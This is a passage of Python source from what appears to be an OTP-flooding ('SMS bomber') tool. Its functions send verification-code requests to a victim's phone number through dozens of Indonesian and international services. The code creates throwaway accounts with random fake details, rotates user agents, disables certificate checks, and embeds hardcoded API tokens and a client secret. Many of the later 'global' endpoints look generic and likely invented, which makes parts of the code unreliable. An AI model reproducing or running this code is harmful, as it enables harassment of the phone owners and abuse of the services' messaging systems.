        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 37. RCX
def send_rcx_otp(phone):
    try:
        sess = requests.Session()
        phone_08 = fmt_08(phone)
        name = 'User' + ''.join(random.choices(string.ascii_lowercase, k=5))
        email = f"{name.lower()}@gmail.com"
        sess.get("https://sso.rcx.co.id/register", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        token = sess.cookies.get("XSRF-TOKEN", "")
        if not token:
            return False, None, 'No token'
        url = "https://sso.rcx.co.id/auth/passwordless/request"
        data = {"_token": token, "mode": "register", "channel": "whatsapp", "name": name, "email": email, "identifier": phone_08}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and (resp.status_code == 302 or resp.status_code < 400):
            return True, resp.status_code, 'Redirect'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 38. SAHABAT TEKNISI
def send_sahabat_otp(phone):
    try:
        url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
        payload = {"phone": fmt_08(phone)}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 39. AUTO2000
def send_auto2000_otp(phone):
    try:
        url = "https://auto2000.co.id/api/customer/v1/saphybris/whatsapp/generate-otp"
        payload = {"phoneNumber": fmt_08(phone), "isCheckOtpLimit": True, "uniqueID": fmt_08(phone), "isLogin": False}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and (resp.status_code == 200 or 'acknowledge' in resp.text.lower()):
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 40. ASTRA DAIHATSU
def send_astra_otp(phone):
    try:
        sess = requests.Session()
        sess.get("https://www.astra-daihatsu.id/register", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        csrf = sess.cookies.get("csrf-token", "")
        if not csrf:
            return False, None, 'No CSRF'
        url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
        payload = {"phoneNo": fmt_phone_only(phone)}
        headers = {'Content-Type': 'application/json', 'csrftoken': csrf, 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and (resp.status_code == 200 or 'success' in resp.text.lower()):
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 41. ROYAL CANIN
def send_royalcanin_otp(phone):
    try:
        sess = requests.Session()
        sess.get("https://club.royalcanin.id/sign-up", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        url = "https://club.royalcanin.id/api/get_otp"
        payload = {"params": {"Email": "", "mobile_number": fmt_plus(phone), "OTPType": "IM"}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 42. WATSONS
def send_watsons_otp(phone):
    try:
        url = "https://api.watsons.co.id/api/v2/wtcid/otpToken?formId=registrationOTPForm_Web3&lang=id&curr=IDR"
        payload = {"uid": "", "action": "GENERAL", "countryCode": "62", "target": fmt_phone_only(phone), "type": "WHATSAPP"}
        headers = {'Content-Type': 'application/json', 'Authorization': 'bearer Pi_D6dqblYElXgy4mWOXjkLCaZg', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and (resp.status_code == 200 or 'token' in resp.text.lower()):
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 43. 99.CO
def send_99co_otp(phone):
    try:
        sess = requests.Session()
        sess.get("https://www.99.co/id", headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        token = sess.cookies.get("_99-acs-token", "")
        if not token:
            return False, None, 'No token'
        url = "https://www.99.co/id/api/biz/messaging/otp-events"
        payload = {"brand": "99id", "destination_address": fmt_plus(phone), "type_id": 2}
        headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {token}', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 44. BELIRUMAH
def send_belirumah_otp(phone):
    try:
        url = "https://api.belirumah.co/api/otp/request_new"
        payload = {"phone_number": fmt_plus(phone)}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and (resp.status_code == 200 or 'success' in resp.text.lower()):
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 45. FASTWORK
def send_fastwork_otp(phone):
    try:
        url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
        payload = {"phone_number": fmt_08(phone)}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and (resp.status_code == 200 or 'reference_code' in resp.text.lower()):
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 46. BEAUTYHAUL
def send_beautyhaul_otp(phone):
    try:
        sess = requests.Session()
        name = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        reg_payload = {"nama_depan": name, "nama_belakang": name, "email": email, "nomor_kode_id": "100", "nomor_kode_value": "62", "nomor_ponsel": fmt_phone_only(phone), "password": "Testt#12334", "konfirmasi_password": "Testt#12334", "tanggal_lahir": "20 Jun 2015", "jenis_kelamin": random.choice(["Female", "Male"]), "g-recaptcha-response": "", "subscribe": "true", "terms": "true"}
        sess.post("https://www.beautyhaul.com/ajax/account/save_register", json=reg_payload, headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        resp = sess.post("https://www.beautyhaul.com/ajax/account/send_otp", json={"method": "WhatsApp"}, headers={'User-Agent': get_random_user_agent()}, verify=False)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 47. HAINAYA
def send_hainaya_otp(phone):
    try:
        phone_clean = fmt_phone_only(phone)
        url = "https://app.hainaya.id/api/onboarding/register"
        business_name = 'Test' + ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize() + str(random.randint(10,99))
        payload = {"business_name": business_name, "vertical": "salon", "vendor_type": "nail_salon", "business_phone": phone_clean, "owner_name": "", "owner_phone": phone_clean}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and (resp.status_code == 201 or 'otp' in resp.text.lower()):
            return True, resp.status_code, 'OK'
        if resp and resp.status_code == 409:
            url2 = "https://app.hainaya.id/api/auth/login"
            resp2 = safe_request('POST', url2, headers=headers, json={"phone_number": phone_clean}, timeout=15)
            if resp2 and resp2.status_code == 200:
                return True, 200, 'Login'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 48. MINUMYUKKAKA
def send_minumyukkaka_otp(phone):
    try:
        sess = requests.Session()
        phone_08 = fmt_08(phone)
        name = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        password = 'pass#' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
        reg_data = {"registerModel[first_name]": name, "registerModel[last_name]": "", "registerModel[email]": email, "registerModel[phone]": phone_08, "registerModel[otp]": "", "registerModel[gender]": "", "registerModel[date_of_birth]": "", "registerModel[IsAddressRequired]": "false", "registerModel[address]": "", "registerModel[additional_address]": "", "registerModel[city]": "", "registerModel[zip]": "", "registerModel[country_code]": "", "registerModel[country]": "", "registerModel[state]": "", "registerModel[password]": password, "registerModel[verify_password]": password, "registerModel[pin]": "", "registerModel[verify_pin]": ""}
        sess.post("https://minumyukkaka.com/services/liquid/Register", data=reg_data, headers={'User-Agent': get_random_user_agent()}, timeout=10, verify=False)
        x_sat = sess.cookies.get('x-sat', '') or ''.join(random.choices(string.ascii_letters + string.digits + '+/=', k=44))
        url = "https://minumyukkaka.com/services/identity/requestOTP"
        data = {"destination": phone_08, "otpLength": "6"}
        headers = {'x-sat': x_sat, 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and (resp.status_code == 200 or 'success' in resp.text.lower()):
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 49. SIDEMANG
def send_sidemang_otp(phone):
    try:
        url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
        email = ''.join(random.choices(string.ascii_lowercase, k=5)) + str(random.randint(100,999)) + '@gmail.com'
        payload = {"phoneNumber": fmt_08(phone), "email": email}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and (resp.status_code == 200 or 'otpDispatched' in resp.text.lower()):
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 50. LAPORMASBUP
_registered = {}
def send_lapormasbup_otp(phone):
    try:
        global _registered
        phone_08 = fmt_08(phone)
        if phone_08 in _registered:
            url = "https://lapormasbup.klaten.go.id/api/kirim-ulang-otp"
            headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
            resp = safe_request('POST', url, headers=headers, json={"mobilephone": phone_08}, timeout=15)
            if resp and (resp.status_code == 200 or 'berhasil' in resp.text.lower()):
                return True, resp.status_code, 'Resend'
            return False, resp.status_code if resp else None, ''
        name = ''.join(random.choices(string.ascii_letters, k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        password = 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + '$'
        url = "https://lapormasbup.klaten.go.id/api/register"
        payload = {"name": name, "email": email, "mobilephone": phone_08, "gender": random.choice(['Laki-Laki', 'Perempuan']), "warga_birth_date": f"{random.randint(1966,2010)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}", "password": password, "address": "Jl. Test No. " + str(random.randint(1,200))}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and (resp.status_code == 200 or 'berhasil' in resp.text.lower()):
            _registered[phone_08] = True
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 51. PTSP KEMENAG
def send_ptspkemenag_otp(phone):
    try:
        url = "https://dev-ptsp.kemenag.go.id/api/auth/register"
        name = ''.join(random.choices(string.ascii_letters, k=5)).capitalize()
        email = f"{name.lower()}{random.randint(100,999)}@gmail.com"
        chars = list(string.ascii_letters + string.digits)
        random.shuffle(chars)
        password = 'Pass' + ''.join(chars[:6]) + '$'
        payload = {"nama": name, "wa": fmt_08(phone), "email": email, "password": password}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and (resp.status_code == 200 or 'success' in resp.text.lower()):
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 52. RUMAH123
def send_rumah123_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://www.rumah123.com/api/otp/request-otp"
        payload = {"cancelledRequestId": str(random.randint(100000, 999999)), "ipAddress": get_public_ip() or '192.168.1.1', "phoneNumber": phone_raw, "portalId": 1, "type": "WHATSAPP", "url": "https://www.rumah123.com/user/login"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 53. PAPER.ID
def send_paper_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://register.paper.id/api/v1/auth/register/send-otp"
        payload = {"phone": phone_plus, "method": "whatsapp", "registered_by": "flutter mweb"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 54. DEPOP
def send_depop_otp(phone):
    try:
        url = "https://webapi.depop.com/api/auth/v1/verify/phone"
        payload = {"phone_number": fmt_phone_only(phone), "country_code": "ID"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('PUT', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 55. ICQ
def send_icq_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://u.icq.net/api/v14/rapi/auth/sendCode"
        payload = {"reqId": f"{random.randint(10000,99999)}-{int(time.time())}", "params": {"phone": phone_plus, "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 56. CAIRIN
def send_cairin_otp(phone):
    try:
        url = "https://app.cairin.id/v1/app/sms/sendCaptcha"
        data = {"haveImageCode": "0", "fileName": uuid.uuid4().hex, "phone": fmt_08(phone), "imageCode": "", "userImei": "", "type": "registry"}
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 57. MAPCLUB
def send_mapclub_otp(phone):
    try:
        url = "https://cmsapi.mapclub.com/api/signup-otp"
        data = {"phone": fmt_08(phone)}
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 58. BUKUWARUNG
def send_bukuwarung_otp(phone):
    try:
        url = "https://api-v2.bukuwarung.com/api/v2/auth/otp/send"
        payload = {"action": "LOGIN_OTP", "countryCode": "+62", "deviceId": "test-1", "method": "WA", "phone": fmt_08(phone), "clientId": "2e3570c6-317e-4524-b284-980e5a4335b6", "clientSecret": "S81VsdrwNUN23YARAL54MFjB2JSV2TLn"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 59. RUPIAH CEPAT
def send_rupiahcepat_otp(phone):
    try:
        phone_raw = fmt_phone_only(phone)
        url = "https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code"
        data = {"data": json.dumps({"mobile": phone_raw, "noise": str(int(time.time() * 1000)), "request_time": str(int(time.time() * 1000)), "access_token": "11111"})}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 60. DEKORUMA
def send_dekoruma_otp(phone):
    try:
        phone_plus = fmt_plus(phone)
        url = "https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json"
        payload = {"phoneNumber": phone_plus, "platform": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 61. KLOOK
def send_klook_otp(phone):
    try:
        url = f"https://www.klook.com/v2/userapisrv/public/verification/code/send?trace_id={uuid.uuid4()}"
        payload = {"action": "login_register", "type": 1, "rcv": fmt_plus(phone), "is_resend": False, "payload": {"mobile": fmt_plus(phone), "term_ids": [330], "mobile_token": "", "invite_code": ""}, "_rc": "", "rcv_token": ""}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent(), 'x-platform': 'mobile'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 62. ERAFONE
def send_erafone_otp(phone):
    try:
        url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
        payload = {"identifier": fmt_plus(phone), "type": "identifier_validation"}
        headers = {'Content-Type': 'application/json', 'Authorization': 'Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=', 'otp-provider': 'whatsapp', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code == 200:
            return True, 200, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 63. HRS-BRE
def send_hrsbre_otp(phone):
    try:
        phone_08 = fmt_08(phone)
        url = "https://career.hrs-bre.site/auth/sign_up_action"
        nik = ''.join(random.choices(string.digits, k=16))
        email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
        username = ''.join(random.choices(string.ascii_letters, k=8))
        password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits + "#$%&!", k=7))
        boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        body = f"--{boundary}\r\nContent-Disposition: form-data; name=\"nik\"\r\n\r\n{nik}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{email}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"whatsapp\"\r\n\r\n{phone_08}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n{username}\r\n--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{password}\r\n--{boundary}--\r\n"
        headers = {'Content-Type': f'multipart/form-data; boundary={boundary}', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=body, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 64. TUNEUP
def send_tuneup_otp(phone):
    try:
        url = "https://api.tuneup.id/v1/mitra/register/send-otp"
        name = ''.join(random.choices(string.ascii_lowercase, k=8))
        data = {'company_name': f'PT {name.capitalize()}', 'owner_name': name.capitalize(), 'address': ''.join(random.choices(string.ascii_letters + string.digits, k=10)), 'email': f'{name}@mailnesia.com', 'phone_number': fmt_08(phone), 'province_code': '32', 'city_code': '32.04', 'subscription_id': 'undefined', 'channel': 'whatsapp', 'agreement': 'true', 'service_categories[]': '3'}
        headers = {'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# ================================================================
# ===== GLOBAL API =====
# ================================================================

# 65. UBER
def send_uber_otp(phone):
    try:
        url = "https://auth.uber.com/api/v1.0/auth/verification/send"
        payload = {"phone": fmt_us(phone), "locale": "en-US", "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 66. DOORDASH
def send_doordash_otp(phone):
    try:
        url = "https://api.doordash.com/v1/auth/otp/send"
        payload = {"phone_number": fmt_us(phone), "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 67. INSTAGRAM
def send_instagram_otp(phone):
    try:
        url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
        phone_us = fmt_us(phone)
        payload = {"phone_number": phone_us, "username": "user" + str(random.randint(1000,9999)), "email": "", "first_name": "User", "password": "Pass123!"}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, data=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 68. WHATSAPP
def send_whatsapp_otp(phone):
    try:
        url = "https://web.whatsapp.com/api/v1/users/request_code"
        payload = {"phone": fmt_us(phone), "method": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 69. DELIVEROO
def send_deliveroo_otp(phone):
    try:
        url = "https://api.deliveroo.com/v1/auth/otp/send"
        payload = {"phone": fmt_uk(phone), "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 70. JUST EAT
def send_justeat_otp(phone):
    try:
        url = "https://www.just-eat.co.uk/api/auth/otp/send"
        payload = {"phoneNumber": fmt_uk(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 71. FLIPKART
def send_flipkart_otp(phone):
    try:
        url = "https://api.flipkart.com/v1/auth/otp/send"
        payload = {"phoneNumber": fmt_in(phone), "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 72. PAYTM
def send_paytm_otp(phone):
    try:
        url = "https://api.paytm.com/v1/auth/otp/send"
        payload = {"phone": fmt_in(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 73. ZOMATO
def send_zomato_otp(phone):
    try:
        url = "https://www.zomato.com/api/v1/auth/otp/send"
        payload = {"phone": fmt_in(phone), "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 74. IFOOD
def send_ifood_otp(phone):
    try:
        url = "https://api.ifood.com.br/v1/auth/otp/send"
        payload = {"phone": fmt_br(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 75. MERCADOLIVRE
def send_mercadolivre_otp(phone):
    try:
        url = "https://api.mercadolivre.com.br/v1/auth/otp/send"
        payload = {"phone": fmt_br(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 76. LINE
def send_line_otp(phone):
    try:
        url = "https://api.line.me/v1/auth/otp/send"
        payload = {"phone": fmt_jp(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 77. RAKUTEN
def send_rakuten_otp(phone):
    try:
        url = "https://api.rakuten.co.jp/v1/auth/otp/send"
        payload = {"phone": fmt_jp(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 78. NAVER
def send_naver_otp(phone):
    try:
        url = "https://api.naver.com/v1/auth/otp/send"
        payload = {"phone": fmt_kr(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 79. KAKAO
def send_kakao_otp(phone):
    try:
        url = "https://api.kakao.com/v1/auth/otp/send"
        payload = {"phone": fmt_kr(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 80. ZILLOW
def send_zillow_otp(phone):
    try:
        url = "https://www.zillow.com/api/account/verification/send"
        payload = {"phoneNumber": fmt_us(phone), "method": "sms"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 81. SHOPEE MY
def send_shopee_my_otp(phone):
    try:
        url = "https://shopee.com.my/api/v1/auth/otp/send"
        payload = {"phone": fmt_my(phone), "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 82. GRAB MY
def send_grab_my_otp(phone):
    try:
        url = "https://api.grab.com/v1/auth/otp/send"
        payload = {"phone": fmt_my(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 83. GCASH
def send_gcash_otp(phone):
    try:
        url = "https://api.gcash.com/api/v1/auth/otp/send"
        payload = {"phoneNumber": fmt_ph(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 84. LAZADA PH
def send_lazada_ph_otp(phone):
    try:
        url = "https://api.lazada.com.ph/rest/order/get/otp"
        payload = {"phone": fmt_ph(phone), "type": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 85. GRAB SG
def send_grab_sg_otp(phone):
    try:
        url = "https://api.grab.com/v1/auth/otp/send"
        payload = {"phone": fmt_sg(phone), "method": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 86. FOODPANDA SG
def send_foodpanda_sg_otp(phone):
    try:
        url = "https://api.foodpanda.sg/v1/auth/otp/send"
        payload = {"phone": fmt_sg(phone), "channel": "whatsapp"}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
